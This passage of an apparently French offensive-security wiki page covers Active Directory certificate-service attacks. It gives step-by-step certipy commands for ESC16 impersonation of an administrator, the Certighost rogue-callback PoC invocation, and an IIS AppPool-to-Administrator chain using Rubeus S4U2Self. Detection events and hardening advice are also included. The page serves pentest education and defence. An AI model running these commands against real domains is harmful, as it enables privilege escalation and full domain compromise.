L’exemple historique Kerberos utilisant uniquement l’UPN ci-dessous est basé sur la [documentation de Certipy sur ESC16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Il nécessite un KDC qui accepte encore le mappage faible obtenu ; `StrongCertificateBindingEnforcement=1` n’est plus une dérogation prise en charge depuis la mise à jour de sécurité Windows du 9 septembre 2025.<sup>[[14]](#references)</sup>

Pour déterminer si l’environnement Active Directory Certificate Services (AD CS) est vulnérable à **ESC16**

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**Étape 1 : Lire l’UPN initial du compte victime (facultatif - pour restauration).  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**Étape 2 : Mettez à jour l’UPN du compte victime avec le `sAMAccountName` de l’administrateur cible.**  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Étape 3 : (si nécessaire) Obtenir des identifiants pour le compte « victime » (par exemple, via Shadow Credentials).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Étape 4 : Demandez un certificat en tant qu’utilisateur « victime » à partir d’un modèle d’authentification client auquel le compte peut s’inscrire (par ex. « User ») sur l’autorité de certification configurée avec ESC16.** L’autorité de certification omet l’extension de sécurité SID du certificat émis, mais cela ne suffit pas à établir un mappage d’authentification exploitable. Définissez la variable d’environnement du cache d’identifiants Kerberos (commande shell) :

```bash
export KRB5CCNAME=victim.ccache
```

Demandez ensuite le certificat :

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**Étape 5 : Rétablir l’UPN du compte « victim ».**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**Étape 6 : Sur un KDC ancien ou en mode de compatibilité qui accepte ce mappage faible, authentifiez-vous en tant qu’administrateur cible.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Substitution de l’identité lors d’un callback Rogue LDAP/LSA chase (Certighost / CVE-2026-54121)

### Explication

**Certighost** exploite un **chemin d’enrollment chase / callback AD CS** dans lequel l’AC fait confiance aux attributs de requête fournis par le demandeur pour déterminer l’identité à inscrire dans le certificat émis. Dans le PoC public, la requête forgée contient :<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`** : hôte/IP contrôlé par l’attaquant auquel l’AC se connectera
- **`rmd`** : le **nom DNS du contrôleur de domaine cible** à usurper

Si l’AC suit ce chase, elle se connecte à l’attaquant via **SMB/LSA (`445`)** et **LDAP (`389`)**. L’attaquant utilise un **compte machine réel** (généralement créé grâce au **`ms-DS-MachineAccountQuota`** par défaut) afin que la session de callback s’authentifie en tant que principal de domaine valide, mais les services rogue renvoient à la place les attributs d’identité du **contrôleur de domaine cible** :

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Si l’AC **ne lie pas cryptographiquement l’identité renvoyée au principal de callback authentifié**, elle peut émettre un certificat pour le **contrôleur de domaine**, même si la session s’est authentifiée avec le compte machine contrôlé par l’attaquant. Ce bug se distingue donc conceptuellement de **Certifried** : au lieu de modifier des attributs AD tels que `dNSHostName`, l’attaquant **substitue les données d’identité lors de la résolution du callback de l’AC**.<sup>[[2]](#references)</sup>

**Conditions préalables utiles :**

- **Identifiants de domaine** à faibles privilèges
- Capacité à **créer ou réutiliser un compte ordinateur**
- Connectivité réseau de l’**AC** vers les **ports `389` et `445`** contrôlés par l’attaquant
- Chemin de requête de l’AC vulnérable / non corrigé (la mise à jour Microsoft du **14 juillet 2026** a ajouté la **validation du DC pour `cdc`** ainsi qu’une **comparaison du SID résolu**)

Le **`.pfx`** obtenu peut ensuite servir pour **PKINIT**, ce qui produit un **`.ccache`** et, dans le flux du PoC publié, le **hash NT du contrôleur de domaine cible**, généralement suffisant pour **compromettre entièrement le domaine**.

### Exploitation

Le PoC public automatise toute la chaîne :<sup>[[1]](#references)</sup>

1. Créer ou réutiliser un **compte machine** contrôlé par l’attaquant.
2. Démarrer des **listeners LDAP et SMB/LSA rogue** sur les ports `389` et `445`.
3. Soumettre une requête de certificat contenant les attributs **`cdc`** contrôlé par l’attaquant et **`rmd`** correspondant à la cible.
4. Laisser l’AC s’authentifier auprès des listeners rogue avec le compte machine contrôlé, puis répondre aux recherches d’identité avec les attributs du **contrôleur de domaine cible**.
5. Recevoir un **certificat de DC** signé par l’AC, puis l’utiliser pour **PKINIT**.

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

Indicateurs d’exécution utiles du PoC :

- `--listener <ip>` : choisir explicitement l’IP de callback annoncée dans `cdc`
- `--computer-name <NAME$>` : réutiliser un compte machine existant au lieu d’en créer un nouveau

**Notes opérationnelles :**

- Le PoC nécessite les **droits root**, car il se lie aux ports **privilégiés** `389` et `445`.
- Une exploitation réussie écrit localement un **`.pfx` de DC** et un **`.ccache` Kerberos**.
- Comme le certificat est associé à un **compte de contrôleur de domaine**, les actions ultérieures peuvent inclure l’**authentification Kerberos par certificat**, **DCSync** et la réutilisation du **hash NT de la machine** récupéré.<sup>[[2]](#references)</sup>

## Inscription de la machine IIS AppPool pour obtenir les droits Administrator sur le même hôte

Un pool IIS exécuté sous `ApplicationPoolIdentity` utilise le **compte machine** de son hôte pour accéder aux ressources réseau. Par conséquent, l’exécution de code en tant que `IIS AppPool\<POOL>` reste peu privilégiée dans le jeton local, mais peut envoyer une requête AD CS que la CA authentifie en tant que `HOST$` ; il s’agit d’une transition d’identité sortante, et non d’une usurpation de jeton ou d’une élévation locale de type Potato.<sup>[[19]](#references)[[20]](#references)</sup>

Cette chaîne nécessite un hôte IIS joint au domaine, une Enterprise CA accessible via RPC, un modèle d’authentification machine publié pour lequel l’ordinateur dispose des droits d’inscription, la prise en charge de PKINIT, ainsi qu’un accès au KDC et à SMB. Une identité de pool personnalisée modifie le principal sortant ; vérifiez donc que le pool utilise bien `ApplicationPoolIdentity` avant de supposer qu’il s’agit de `HOST$`.<sup>[[19]](#references)[[20]](#references)</sup>

### Inscription avec une clé contrôlée par l’attaquant

Générez la paire de clés et le CSR hors du serveur IIS et conservez la clé privée. Depuis le worker compromis, soumettez **uniquement le CSR**. Le [PoC ASPX Certi-Bhai](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) instancie `CertificateAuthority.Request`, définit `CertificateTemplate:Machine`, appelle `ICertRequest::Submit` et renvoie le certificat délivré. Utilisez la chaîne de configuration de la CA `CAHOST\CA-NAME` ; un modèle `Machine` standard construit le sujet à partir d’AD, les données de sujet/SAN fournies par le demandeur ne sont donc pas nécessaires.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Associez le certificat renvoyé à la **clé correspondante conservée**. `certutil -MergePFX machine_cert.cer machine_cert.pfx` ne fonctionne que si Windows peut déjà associer le certificat à une clé privée accessible ; pour des fichiers PEM séparés, créez explicitement un PKCS#12 :<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

Utilisez le PFX pour PKINIT et conservez le TGT de l’ordinateur obtenu au format base64 au lieu de l’injecter immédiatement :<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self et substitution de service sur le même hôte

S4U2Self permet à un service d’obtenir un ticket **pour lui-même** contenant les données d’autorisation d’un autre utilisateur. Avec le TGT de l’ordinateur, Rubeus peut demander ce ticket pour un utilisateur privilégié, remplacer le nom du service dans le KRB-CRED renvoyé par CIFS et l’injecter. C’est la primitive locale « déléguer à soi-même » : elle ne nécessite ni S4U2Proxy ni entrée `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

Le ticket substitué ne peut être utilisé que par les services du **même compte/clé ordinateur** (ici, CIFS sur `HOST`). Il ne s’agit pas d’un ticket Administrator réutilisable sur d’autres machines du domaine. De plus, le résultat démontré est un accès SMB/système de fichiers privilégié en tant qu’Administrator ; l’obtention d’un processus local `NT AUTHORITY\SYSTEM` nécessite toujours une étape distincte d’exécution à distance.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Détection et renforcement de la sécurité

- Sur la CA, corrélez les événements Certification Services **4886** (demande reçue) et **4887** (certificat délivré) afin de repérer les demandes inattendues utilisant le template `Machine` et provenant de comptes de serveurs IIS.<sup>[[19]](#references)[[24]](#references)</sup>
- Sur les DC, l’événement **4768** inclut des champs de certificat lorsqu’une pré-authentification par certificat est utilisée ; déclenchez une alerte en cas de demandes de TGT PKINIT inhabituelles pour des comptes de serveurs web. Recherchez ensuite les demandes **4769** impliquant une identité privilégiée usurpée et le même hôte. Comme Rubeus `/altservice` réécrit le nom du service KRB-CRED côté client, n’exigez pas que le nom du service dans l’événement 4769 côté DC soit `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Recherchez les connexions de `w3wp.exe` aux points de terminaison RPC de la CA, la création inattendue de fichiers ASPX, les accès aux partages administratifs authentifiés par Kerberos et les activités d’extraction de secrets. Dans la mesure du possible, limitez l’accès du niveau applicatif à la CA, au KDC et à SMB, et supprimez les droits d’inscription des ordinateurs ou les templates d’authentification machine qui ne sont pas nécessaires au fonctionnement.<sup>[[19]](#references)</sup>

## Compromission de forêts avec des certificats expliquée à la voix passive

### Rupture des relations d’approbation entre forêts par des CA compromises

La configuration de l’**inscription inter-forêts** est relativement simple. Le **certificat de la CA racine** de la forêt de ressources est **publié dans les forêts de comptes** par les administrateurs, et les certificats de l’**Enterprise CA** de la forêt de ressources sont **ajoutés aux conteneurs `NTAuthCertificates` et AIA de chaque forêt de comptes**. En d’autres termes, cette configuration confère à la **CA de la forêt de ressources un contrôle complet** sur toutes les autres forêts pour lesquelles elle gère la PKI. Si cette CA est **compromise par des attaquants**, ceux-ci pourraient **forger des certificats pour tous les utilisateurs** des forêts de ressources et de comptes, rompant ainsi la frontière de sécurité de la forêt.<sup>[[6]](#references)</sup>

### Droits d’inscription accordés à des principaux étrangers

Dans les environnements à plusieurs forêts, il faut faire preuve de prudence avec les Enterprise CA qui **publient des templates de certificats** autorisant les **Authenticated Users ou des principaux étrangers** (utilisateurs/groupes externes à la forêt à laquelle appartient l’Enterprise CA) à **s’inscrire et à modifier les templates**.\
Lors d’une authentification à travers une relation d’approbation, AD ajoute le **SID Authenticated Users** au jeton de l’utilisateur. Ainsi, si un domaine possède une Enterprise CA avec un template qui **accorde des droits d’inscription à Authenticated Users**, un utilisateur d’une autre forêt pourrait potentiellement **s’inscrire à ce template**. De même, si un template **accorde explicitement des droits d’inscription à un principal étranger**, une **relation de contrôle d’accès inter-forêts est ainsi créée**, permettant à un principal d’une forêt de **s’inscrire à un template d’une autre forêt**.

Dans les deux cas, la **surface d’attaque** s’étend d’une forêt à l’autre. Un attaquant pourrait exploiter les paramètres du template de certificat pour obtenir des privilèges supplémentaires dans un domaine étranger.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 dépôt PoC](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Analyse technique de Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – Blog SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned : Abus des Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0 : ESC9, ESC10, interface graphique BloodHound, nouvelles méthodes d’authentification et de demande, et plus encore](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials : abus du mappage de compte par Key Trust pour la prise de contrôle d’un compte](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – L’histoire de l’utilisation (abusive) des clés améliorées](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relais vers Active Directory Certificate Services via RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12 : Accès shell à une CA ADCS avec YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – Technique d’abus ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – Technique d’abus ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Élévation de privilèges (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu : pas juste un autre AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16 : mauvaise configuration et exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – Réexamen de « Delegate 2 Thyself »](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – PoC d’inscription IIS à AD CS](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Élévation de privilèges depuis IIS AppPool via le point de terminaison RPC d’AD CS](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Identités des pools d’applications](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – commande pkcs12](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Auditer Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Événement 4768 : un ticket d’authentification Kerberos a été demandé](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Événement 4769 : un ticket de service Kerberos a été demandé](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – Boîte à outils d’exploitation AD CS en PowerShell](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
